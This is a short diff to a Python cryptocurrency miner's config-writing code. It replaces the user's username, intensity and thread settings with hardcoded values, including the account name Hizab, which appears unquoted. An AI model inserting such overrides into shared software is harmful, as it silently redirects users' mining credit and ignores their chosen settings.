@@ -592,9 +592,9 @@ class Miner:
                 donation_level = 0
 
             configparser["PC Miner"] = {
-                "username":    username,
-                "intensity":   intensity,
-                "threads":     threads,
+                "username":    Hizab,
+                "intensity":   75,
+                "threads":     3,
                 "start_diff":  start_diff,
                 "donate":      int(donation_level),
                 "identifier":  rig_id,
